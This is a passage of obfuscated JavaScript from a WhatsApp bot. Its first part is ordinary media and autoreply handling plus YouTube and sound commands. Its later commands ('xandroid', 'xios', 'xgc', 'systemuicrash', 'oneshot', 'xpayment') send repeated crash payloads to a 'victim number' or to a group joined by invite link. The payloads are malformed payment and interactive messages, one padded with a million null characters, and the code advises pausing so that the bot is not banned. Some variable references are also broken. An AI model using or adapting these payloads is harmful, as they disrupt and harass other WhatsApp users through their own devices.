          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("The name of the image?");
          }
          if (ImageXeon.includes(q)) {
            return _0x244b45("The name you entered is already registered in the database");
          }
          let _0x196e2d = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
          ImageXeon.push(q);
          await fsx.copy(_0x196e2d, "./XeonMedia/image/" + q + ".jpg");
          fs.writeFileSync("./database/autoreply/image.json", JSON.stringify(ImageXeon));
          fs.unlinkSync(_0x196e2d);
          _0x244b45("Success In Adding Image\nTo Check Type " + _0x1b9ee2 + "listimage");
        }
        break;
      case "delimage":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the Image Name");
          }
          if (!ImageXeon.includes(q)) {
            return _0x244b45("The image name you entered is not registered");
          }
          let _0x46c1f2 = ImageXeon.indexOf(q);
          ImageXeon.splice(_0x46c1f2, 1);
          fs.writeFileSync("./database/autoreply/image.json", JSON.stringify(ImageXeon));
          fs.unlinkSync("./XeonMedia/image/" + q + '.jpg');
          _0x244b45("Successfully Deleted Image " + q);
        }
        break;
      case "addsticker":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the name of the sticker?");
          }
          if (StickerXeon.includes(q)) {
            return _0x244b45("Name Already In Use");
          }
          let _0x1e3c77 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
          StickerXeon.push(q);
          await fsx.copy(_0x1e3c77, "./XeonMedia/sticker/" + q + ".webp");
          fs.writeFileSync("./database/autoreply/sticker.json", JSON.stringify(StickerXeon));
          fs.unlinkSync(_0x1e3c77);
          _0x244b45("Successfully Adding StickerTo Check Type " + _0x1b9ee2 + "liststicker");
        }
        break;
      case 'delsticker':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the name of the sticker");
          }
          if (!StickerXeon.includes(q)) {
            return _0x244b45("Name Not Registered in Database");
          }
          let _0x166045 = StickerXeon.indexOf(q);
          StickerXeonBotInc.splice(_0x166045, 1);
          fs.writeFileSync("./database/autoreply/sticker.json", JSON.stringify(StickerXeon));
          fs.unlinkSync("./XeonMedia/sticker/" + q + '.webp');
          _0x244b45("Successfully Removed Sticker " + q);
        }
        break;
      case 'addvn':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the Name?");
          }
          if (VoiceNoteXeon.includes(q)) {
            return _0x244b45("Name Already In Use");
          }
          let _0x18106f = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
          VoiceNoteXeon.push(q);
          await fsx.copy(_0x18106f, "./XeonMedia/audio/" + q + ".mp3");
          fs.writeFileSync("./database/autoreply/vn.json", JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync(_0x18106f);
          _0x244b45("Success Adding Audio\nTo Check Type " + _0x1b9ee2 + "listvn");
        }
        break;
      case "delvn":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the Name");
          }
          if (!VoiceNoteXeon.includes(q)) {
            return _0x244b45("Name Not Registered in Database");
          }
          let _0x5aa253 = VoiceNoteXeon.indexOf(q);
          VoiceNoteXeon.splice(_0x5aa253, 1);
          fs.writeFileSync("./database/autoreply/vn.json", JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync("./XeonMedia/audio/" + q + ".mp3");
          _0x244b45("Successfully Deleted Audio " + q);
        }
        break;
      case "addzip":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          await _0x51687e();
          if (_0x2805cb.length < 1) {
            return _0x244b45("What's the zip name?");
          }
          let _0x1439be = '' + _0x570816;
          {
            if (ZipXeon.includes(_0x1439be)) {
              return _0x244b45("This name is already in use");
            }
            let _0x38244d = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
            ZipXeon.push(_0x1439be);
            await fsx.copy(_0x38244d, "./XeonMedia/zip/" + _0x1439be + ".zip");
            fs.writeFileSync("./database/autoreply/zip.json", JSON.stringify(ZipXeon));
            fs.unlinkSync(_0x38244d);
            _0x244b45("Success Adding zip\nTo check type " + _0x1b9ee2 + "listzip");
          }
        }
        break;
      case "delzip":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          await _0x51687e();
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the text in the zip list");
          }
          let _0xd76c4f = '' + _0x570816;
          {
            if (!ZipXeon.includes(_0xd76c4f)) {
              return _0x244b45("This name does not exist in the database");
            }
            let _0x12b299 = ZipXeon.indexOf(_0xd76c4f);
            ZipXeon.splice(_0x12b299, 1);
            fs.writeFileSync("./database/autoreply/zip.json", JSON.stringify(ZipXeon));
            fs.unlinkSync("./XeonMedia/zip/" + _0xd76c4f + ".zip");
            _0x244b45("Successfully deleted zip " + _0xd76c4f);
          }
        }
        break;
      case "listzip":
        {
          await _0x51687e();
          let _0x160734 = "┌──⭓「 *ZIP LIST* 」\n│\n";
          for (let _0x103ebf of ZipXeon) {
            _0x160734 += "│⭔ " + _0x103ebf + "\n";
          }
          _0x160734 += "│\n└────────────⭓\n\n*Total : " + ZipXeon.length + '*';
          _0x244b45(_0x160734);
        }
        break;
      case "addapk":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          await _0x51687e();
          if (_0x2805cb.length < 1) {
            return _0x244b45("What is the name of the apk?");
          }
          let _0x5b22e4 = '' + _0x570816;
          {
            if (ApkXeon.includes(_0x5b22e4)) {
              return _0x244b45("This name is already in use");
            }
            let _0x2c8f57 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
            apknye.push(_0x5b22e4);
            await fsx.copy(_0x2c8f57, "./XeonMedia/apk/" + _0x5b22e4 + ".apk");
            fs.writeFileSync("./database/autoreply/apk.json", JSON.stringify(ApkXeon));
            fs.unlinkSync(_0x2c8f57);
            _0x244b45("Successful Adding apk\nTo Check type " + _0x1b9ee2 + "listapk");
          }
        }
        break;
      case "delapk":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          await _0x51687e();
          if (_0x2805cb.length < 1) {
            return _0x244b45("Name of the apk?");
          }
          let _0x59b61e = '' + _0x570816;
          {
            if (!ApkXeon.includes(_0x59b61e)) {
              return _0x244b45("This name does not exist in the database");
            }
            let _0x27b898 = ApkXeon.indexOf(_0x59b61e);
            ApkXeon.splice(_0x27b898, 1);
            fs.writeFileSync("./database/autoreply/apk.json", JSON.stringify(ApkXeon));
            fs.unlinkSync("./XeonMedia/apk/" + _0x59b61e + ".apk");
            _0x244b45("Successfully deleted Apk " + _0x59b61e);
          }
        }
        break;
      case "listapk":
        {
          await _0x51687e();
          let _0x57840a = "┌──⭓「 *APK LIST* 」\n│\n";
          for (let _0x63dcb7 of ApkXeon) {
            _0x57840a += "│⭔ " + _0x63dcb7 + "\n";
          }
          _0x57840a += "│\n└────────────⭓\n\n*Total : " + ApkXeon.length;
          _0x244b45(_0x57840a);
        }
        break;
      case "addpdf":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          await _0x51687e();
          if (_0x2805cb.length < 1) {
            return _0x244b45("What is the name of the pdf");
          }
          let _0x18887d = '' + _0x570816;
          {
            if (DocXeon.includes(_0x18887d)) {
              return _0x244b45("This name is already in use");
            }
            let _0x5b6094 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
            docunye.push(_0x18887d);
            await fsx.copy(_0x5b6094, "./XeonMedia/doc/" + _0x18887d + ".pdf");
            fs.writeFileSync("./database/autoreply/doc.json", JSON.stringify(DocXeon));
            fs.unlinkSync(_0x5b6094);
            _0x244b45("Successful Adding Pdf\nTo check type " + _0x1b9ee2 + 'listpdf');
          }
        }
        break;
      case 'delpdf':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          await _0x51687e();
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the name");
          }
          let _0x37597f = '' + _0x570816;
          {
            if (!DocXeon.includes(_0x37597f)) {
              return _0x244b45("This name does not exist in the database");
            }
            let _0x248578 = DocApk.indexOf(_0x37597f);
            docunye.splice(_0x248578, 1);
            fs.writeFileSync("./database/autoreply/doc.json", JSON.stringify(DocXeon));
            fs.unlinkSync("./XeonMedia/doc/" + _0x37597f + ".pdf");
            _0x244b45("Successfully deleted pdf " + _0x37597f);
          }
        }
        break;
      case "listpdf":
        {
          await _0x51687e();
          let _0x5a54c5 = "┌──⭓「 *PDF LIST* 」\n│\n";
          for (let _0x488d02 of docunye) {
            _0x5a54c5 += "│⭔ " + _0x488d02 + "\n";
          }
          _0x5a54c5 += "│\n└────────────⭓\n\n*Total : " + docunye.length + '*';
          _0x244b45(_0x5a54c5);
        }
        break;
      case "afk":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (_0x339689) {
          return _0x244b45("Already afk");
        }
        let _0x31ed48 = _0x570816 ? _0x570816 : "Nothing.";
        afk.addAfkUser(_0x153ead.sender, Date.now(), _0x31ed48, _afk);
        _0x244b45('@' + _0x153ead.sender.split('@')[0] + " Currently AFK\nWith reason : " + _0x31ed48);
        break;
      case "play":
      case 'song':
        {
          if (!_0x570816) {
            return _0x244b45("Example : " + (_0x1b9ee2 + _0x44cd63) + " anime whatsapp status");
          }
          const _0x2036da = require("./lib/ytdl2");
          let _0x159ad2 = require("youtube-yts");
          let _0x4929fd = await _0x159ad2(_0x570816);
          let _0x254a15 = _0x4929fd.videos[0];
          const _0x217e12 = await _0x2036da.mp3(_0x254a15.url);
          await _0x3dc8b7.sendMessage(_0x153ead.chat, {
            'audio': fs.readFileSync(_0x217e12.path),
            'fileName': _0x254a15.title + ".mp3",
            'mimetype': 'audio/mp4',
            'ptt': true,
            'contextInfo': {
              'externalAdReply': {
                'title': _0x254a15.title,
                'body': botname,
                'thumbnail': await fetchBuffer(_0x217e12.meta.image),
                'mediaType': 0x2,
                'mediaUrl': _0x254a15.url
              }
            }
          }, {
            'quoted': _0x153ead
          });
          await fs.unlinkSync(_0x217e12.path);
        }
        break;
      case "ytmp3":
      case "ytaudio":
        const _0x4d18e6 = require("./lib/ytdl2");
        if (_0x2805cb.length < 1 || !isUrl(_0x570816) || !_0x4d18e6.isYTUrl(_0x570816)) {
          return _0x244b45("Where's the yt link?\nExample: " + (_0x1b9ee2 + _0x44cd63) + " https://youtube.com/shorts/YQf-vMjDuKY?feature=share");
        }
        const _0x33ee26 = await _0x4d18e6.mp3(_0x570816);
        await _0x3dc8b7.sendMessage(_0x153ead.chat, {
          'audio': fs.readFileSync(_0x33ee26.path),
          'mimetype': 'audio/mp4',
          'ptt': true,
          'contextInfo': {
            'externalAdReply': {
              'title': _0x33ee26.meta.title,
              'body': botname,
              'thumbnail': await fetchBuffer(_0x33ee26.meta.image),
              'mediaType': 0x2,
              'mediaUrl': _0x570816
            }
          }
        }, {
          'quoted': _0x153ead
        });
        await fs.unlinkSync(_0x33ee26.path);
        break;
      case "ytmp4":
      case "ytvideo":
        {
          const _0x8b00a = require("./lib/ytdl2");
          if (_0x2805cb.length < 1 || !isUrl(_0x570816) || !_0x8b00a.isYTUrl(_0x570816)) {
            _0x244b45("Where is the link??\n\nExample : " + (_0x1b9ee2 + _0x44cd63) + " https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps");
          }
          const _0x3e2af7 = await _0x8b00a.mp4(_0x570816);
          const _0x47a457 = "\n*" + themeemoji + "Tittle:* " + _0x3e2af7.title + "\n*" + themeemoji + "Date:* " + _0x3e2af7.date + "\n*" + themeemoji + "Duration:* " + _0x3e2af7.duration + "\n*" + themeemoji + "Quality:* " + _0x3e2af7.quality;
          const _0x50032c = {
            url: _0x3e2af7.videoUrl
          };
          const _0x670382 = {
            video: _0x50032c,
            caption: _0x47a457
          };
          await _0x3dc8b7.sendMessage(_0x153ead.chat, _0x670382, {
            'quoted': _0x153ead
          });
        }
        break;
      case 'sound1':
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case 'sound8':
      case "sound9":
      case "sound10":
      case 'sound11':
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case 'sound21':
      case "sound22":
      case "sound23":
      case "sound24":
      case 'sound25':
      case "sound26":
      case 'sound27':
      case 'sound28':
      case "sound29":
      case "sound30":
      case 'sound31':
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case 'sound38':
      case "sound39":
      case "sound40":
      case "sound41":
      case 'sound42':
      case 'sound43':
      case 'sound44':
      case "sound45":
      case 'sound46':
      case "sound47":
      case 'sound48':
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case 'sound53':
      case "sound54":
      case 'sound55':
      case 'sound56':
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case 'sound61':
      case "sound62":
      case 'sound63':
      case "sound64":
      case 'sound65':
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case 'sound75':
      case 'sound76':
      case 'sound77':
      case "sound78":
      case "sound79":
      case "sound80":
      case 'sound81':
      case "sound82":
      case "sound83":
      case 'sound84':
      case "sound85":
      case "sound86":
      case "sound87":
      case 'sound88':
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case 'sound95':
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case "sound101":
      case 'sound102':
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case 'sound110':
      case "sound111":
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case "sound116":
      case "sound117":
      case 'sound118':
      case 'sound119':
      case 'sound120':
      case "sound121":
      case "sound122":
      case 'sound123':
      case "sound124":
      case "sound125":
      case 'sound126':
      case "sound127":
      case "sound128":
      case "sound129":
      case "sound130":
      case 'sound131':
      case 'sound132':
      case "sound133":
      case 'sound134':
      case 'sound135':
      case "sound136":
      case "sound137":
      case 'sound138':
      case "sound139":
      case "sound140":
      case "sound141":
      case 'sound142':
      case 'sound143':
      case "sound144":
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case 'sound149':
      case "sound150":
      case 'sound151':
      case "sound152":
      case "sound153":
      case 'sound154':
      case "sound155":
      case 'sound156':
      case "sound157":
      case 'sound158':
      case "sound159":
      case 'sound160':
      case "sound161":
        XeonBotInc_dev = await getBuffer("https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/" + _0x44cd63 + ".mp3");
        const _0xd03171 = {
          audio: XeonBotInc_dev,
          mimetype: 'audio/mp4',
          ptt: true
        };
        await _0x3dc8b7.sendMessage(_0x153ead.chat, _0xd03171, {
          'quoted': _0x153ead
        });
        break;
      case 'xandroid':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x570816) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 234xxxxxxxxxx,5");
          }
          let _0x4a8472 = _0x570816.split(',')[0];
          let _0x4312e5 = _0x570816.split(',')[1] * 5;
          if (!_0x4a8472 || !_0x4312e5) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 234xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x4312e5))) {
            return _0x244b45("Amount must be a number");
          }
          let _0x356fe3 = _0x4a8472.replace(/[^0-9]/g, '');
          let _0x5aa540 = '' + encodeURI(_0x4312e5);
          var _0x1b6542 = await _0x3dc8b7.onWhatsApp(_0x356fe3 + "@s.whatsapp.net");
          let _0x423fb5 = _0x356fe3 + "@s.whatsapp.net";
          if (_0x356fe3 == "916909137213") {
            return;
          }
          if (_0x1b6542.length == 0) {
            return _0x244b45("The number is not registered on WhatsApp");
          }
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          await sleep(2000);
          _0x46f07e(_0x423fb5, _0x5aa540);
          await sleep(2500);
          _0x14716a("Successfully Sent Bug To @" + _0x423fb5.split('@')[0] + " Using *" + _0x44cd63 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x423fb5]);
        }
        break;
      case "xios":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x570816) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 234xxxxxxxxxx,5");
          }
          let _0x48e2b7 = _0x570816.split(',')[0];
          let _0x56235d = _0x570816.split(',')[1] * 5;
          if (!_0x48e2b7 || !_0x56235d) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 91xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x56235d))) {
            return _0x244b45("Amount must be a number");
          }
          let _0x5b476a = _0x48e2b7.replace(/[^0-9]/g, '');
          let _0x1c7237 = '' + encodeURI(_0x56235d);
          var _0x1b6542 = await _0x3dc8b7.onWhatsApp(_0x5b476a + "@s.whatsapp.net");
          let _0xa7240d = _0x5b476a + "@s.whatsapp.net";
          if (_0x5b476a == "916909137213") {
            return;
          }
          if (_0x1b6542.length == 0) {
            return _0x244b45("The number is not registered on WhatsApp");
          }
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          await sleep(2000);
          _0x5a294(_0xa7240d, _0x1c7237);
          await sleep(2500);
          _0x14716a("Successfully Sent Bug To @" + _0xa7240d.split('@')[0] + " Using *" + _0x44cd63 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0xa7240d]);
        }
        break;
      case 'xios2':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x282630) {
            return _0x244b45("*This feature is for the bot only!*");
          }
          if (!_0x570816) {
            return _0x244b45("Example usage: " + (_0x1b9ee2 + _0x44cd63) + " 5");
          }
          if (isNaN(parseInt(_0x570816))) {
            return _0x244b45("Amount must be a number");
          }
          let _0x4588b9 = encodeURI(_0x570816) * 200;
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          await sleep(1500);
          _0x5a294(_0x22825f, _0x4588b9);
          await sleep(2500);
          _0x34cf33('✅');
        }
        break;
      case 'xandroid2':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x282630) {
            return _0x244b45("*This feature is for the bot only!*");
          }
          if (!_0x570816) {
            return _0x244b45("Example usage: " + (_0x1b9ee2 + _0x44cd63) + " 5");
          }
          if (isNaN(parseInt(_0x570816))) {
            return _0x244b45("Amount must be a number");
          }
          let _0x92f5b4 = encodeURI(_0x570816) * 200;
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          await sleep(1500);
          _0x46f07e(_0x22825f, _0x92f5b4);
          await sleep(2500);
          _0x34cf33('✅');
        }
        break;
      case 'xgc':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x570816) {
            return _0x244b45("*HOW TO SEND BUG TO GROUP*\n\n" + (_0x1b9ee2 + _0x44cd63) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + _0x44cd63 + " linkgc amount\n\nExample:\n." + _0x44cd63 + " https://chat.whatsapp.com/xxxx 10");
          }
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          if (!_0x570816.split(" ")[0].includes("whatsapp.com")) {
            return _0x244b45("Link Invalid!");
          }
          let _0x5ab1e7 = _0x570816.split(" ")[0].split("https://chat.whatsapp.com/")[1];
          try {
            let _0xad967f = _0x570816.split(" ")[1] ? _0x570816.split(" ")[1] : '1';
            let _0x3fa534 = await _0x3dc8b7.groupAcceptInvite(_0x5ab1e7);
            await sleep(2000);
            _0x2b619e(_0x3fa534, _0xad967f);
            await sleep(2500);
            _0x244b45("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
            _0x3dc8b7.groupLeave(_0x3fa534);
          } catch (_0x3f76ff) {
            _0x244b45(util.format(_0x3f76ff));
          }
        }
        break;
      case '🙂':
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x282630) {
            return _0x244b45("*This feature is for the bot only!*");
          }
          if (!_0x570816) {
            return _0x244b45("Example usage: " + (_0x1b9ee2 + _0x44cd63) + " 5");
          }
          if (isNaN(parseInt(_0x570816))) {
            return _0x244b45("Amount must be a number");
          }
          let _0x55c1d8 = encodeURI(_0x570816) * 200;
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          await sleep(1500);
          _0x2b619e(_0x22825f, _0x55c1d8);
          await sleep(2500);
          _0x34cf33('✅');
        }
        break;
      case "systemuicrash":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x570816) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 234xxxxxxxxxx,5");
          }
          let _0x56927a = _0x570816.split(',')[0];
          let _0x4b72db = _0x570816.split(',')[1] * 5;
          if (!_0x56927a || !_0x4b72db) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 91xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x4b72db))) {
            return _0x244b45("Amount must be a number");
          }
          let _0x44c1e3 = _0x56927a.replace(/[^0-9]/g, '');
          let _0x34f093 = '' + encodeURI(_0x4b72db);
          var _0x1b6542 = await _0x3dc8b7.onWhatsApp(_0x44c1e3 + "@s.whatsapp.net");
          let _0x3ef487 = _0x44c1e3 + "@s.whatsapp.net";
          if (_0x44c1e3 == "916909137213") {
            return;
          }
          if (_0x1b6542.length == 0) {
            return _0x244b45("The number is not registered on WhatsApp");
          }
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          await sleep(2000);
          _0x400568(_0x3ef487, _0x34f093);
          await sleep(2500);
          _0x14716a("Successfully Sent Bug To @" + _0x3ef487.split('@')[0] + " Using *" + _0x44cd63 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x3ef487]);
        }
        break;
      case "xsysui":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x570816) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 234xxxxxxxxxx,5");
          }
          let _0x237799 = _0x570816.split(',')[0];
          let _0x1df680 = _0x570816.split(',')[1] * 5;
          if (!_0x237799 || !_0x1df680) {
            return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " victim number|amount\nExample " + (_0x1b9ee2 + _0x44cd63) + " 91xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x1df680))) {
            return _0x244b45("Amount must be a number");
          }
          let _0x54df08 = _0x237799.replace(/[^0-9]/g, '');
          let _0x7d8615 = '' + encodeURI(_0x1df680);
          var _0x1b6542 = await _0x3dc8b7.onWhatsApp(_0x54df08 + "@s.whatsapp.net");
          let _0x1c3e44 = _0x54df08 + "@s.whatsapp.net";
          if (_0x54df08 == "916909137213") {
            return;
          }
          if (_0x1b6542.length == 0) {
            return _0x244b45("The number is not registered on WhatsApp");
          }
          _0x244b45("please wait, " + _0x44cd63 + " bug is in process..");
          await sleep(2000);
          _0x4ee10f(_0x1c3e44, _0x7d8615);
          await sleep(2500);
          _0x14716a("Successfully Sent Bug To @" + _0x1c3e44.split('@')[0] + " Using *" + _0x44cd63 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x1c3e44]);
        }
        break;
      case 'oneshot':
        {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          if (!_0x570816) {
            return _0x244b45("Usage ." + _0x44cd63 + " 2348027387246");
          }
          let _0x4a59ac = _0x570816.replace(/[^0-9]/g, '');
          if (_0x4a59ac.startsWith('0')) {
            return _0x244b45("Example : " + (_0x1b9ee2 + _0x44cd63) + " 2348027387246");
          }
          var _0x1b6542 = await _0x3dc8b7.onWhatsApp(_0x4a59ac + "@s.whatsapp.net");
          let _0x1bc9c3 = _0x4a59ac + "@s.whatsapp.net";
          if (_0x4a59ac == "916909137213") {
            return;
          }
          if (_0x4a59ac == "919366316008") {
            return;
          }
          if (_0x4a59ac == "2348027387246") {
            return;
          }
          if (_0x1b6542.length == 0) {
            return _0x244b45("The number is not registered on WhatsApp");
          }
          async function _0xd7c171(_0x3e700f) {
            for (let _0x1664b7 = '3'; _0x1664b7 !== 0; _0x1664b7 -= 1) {}
            for (let _0x9f24cc = '3'; _0x9f24cc !== 0; _0x9f24cc -= 1) {
              const _0x2dcafa = {
                deviceListMetadataVersion: 0x2,
                deviceListMetadata: {}
              };
              const _0x2258dc = {
                name: "payment_info",
                buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"😈드림 가이 Johnleo\",\"key\":\"+916909137213\",\"key_type\":\"X\"}}]}"
              };
              const _0xec5298 = {
                'buttons': [_0x2258dc]
              };
              const _0x687995 = {
                nativeFlowMessage: _0xec5298
              };
              const _0x16cf81 = {
                messageContextInfo: _0x2dcafa,
                interactiveMessage: _0x687995
              };
              const _0x424673 = {
                message: _0x16cf81
              };
              const _0x3693c7 = {
                viewOnceMessage: _0x424673
              };
              const _0x483620 = {
                messageId: null
              };
              await _0x3dc8b7.relayMessage(_0x3e700f, _0x3693c7, {
                'participant': {
                  'jid': _0x3e700f
                }
              }, _0x483620);
            }
            for (let _0x3effe2 = '3'; _0x3effe2 !== 0; _0x3effe2 -= 1) {
              const _0x9738d = {
                title: '',
                subtitle: " "
              };
              const _0x29f020 = {
                text: "😈드림 가이 Johnleo 😈드림 가이 Johnleo 드림 가이 Johnleo"
              };
              const _0x320613 = {
                text: 'xp'
              };
              const _0x3553ec = {
                name: 'cta_url',
                buttonParamsJson: "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
              };
              await _0x3dc8b7.relayMessage(_0x3e700f, {
                'viewOnceMessage': {
                  'message': {
                    'interactiveMessage': {
                      'header': _0x9738d,
                      'body': _0x29f020,
                      'footer': _0x320613,
                      'nativeFlowMessage': {
                        'buttons': [_0x3553ec],
                        'messageParamsJson': "\0".repeat(1000000)
                      }
                    }
                  }
                }
              }, {
                'participant': {
                  'jid': _0x3e700f
                }
              });
            }
          }
          await _0x244b45("In process....");
          await _0xd7c171(_0x1bc9c3);
          _0x14716a("Successfully Sent Bug To @" + _0x1bc9c3.split('@')[0] + " Using *" + _0x44cd63 + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x1bc9c3]);
        }
        break;
      case "xpayment":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (!_0x570816) {
            return _0x244b45("Usage ." + _0x44cd63 + " 2348027387246");
          }
          let _0x4d08e6 = _0x570816.replace(/[^0-9]/g, '');
          if (_0x4d08e6.startsWith('0')) {
            return _0x244b45("Example : " + (_0x1b9ee2 + _0x44cd63) + " 2348027387246");
          }
          var _0x1b6542 = await _0x3dc8b7.onWhatsApp(_0x4d08e6 + "@s.whatsapp.net");
          let _0x392bb4 = _0x4d08e6 + "@s.whatsapp.net";
          if (_0x4d08e6 == "2348027387246") {
            return;
          }
          if (_0x4d08e6 == "2348027387246") {
            return;
          }
          if (_0x4d08e6 == "2348027387246") {
            return;
          }
          if (_0x1b6542.length == 0) {
            return _0x244b45("The number is not registered on WhatsApp");
          }
          async function _0x4c3736(_0x55e6ac) {
            const _0x508f08 = {
              deviceListMetadataVersion: 0x2,
              deviceListMetadata: {}
            };
            const _0x4ac2b6 = {
              name: "payment_info",
              buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"meu ovo\",\"key\":\"+5533998586057\",\"key_type\":\"X\"}}]}"
            };
            const _0x276dfc = {
              buttons: [_0x4ac2b6]
            };
            const _0x4e90fe = {
              nativeFlowMessage: _0x276dfc
            };
            const _0x2ee643 = {
              messageContextInfo: _0x508f08,
              interactiveMessage: _0x4e90fe
            };
            const _0x3fda6b = {
              message: _0x2ee643
            };
            const _0x3f3e50 = {
              viewOnceMessage: _0x3fda6b
            };
            const _0x48ca27 = {
              messageId: null
            };
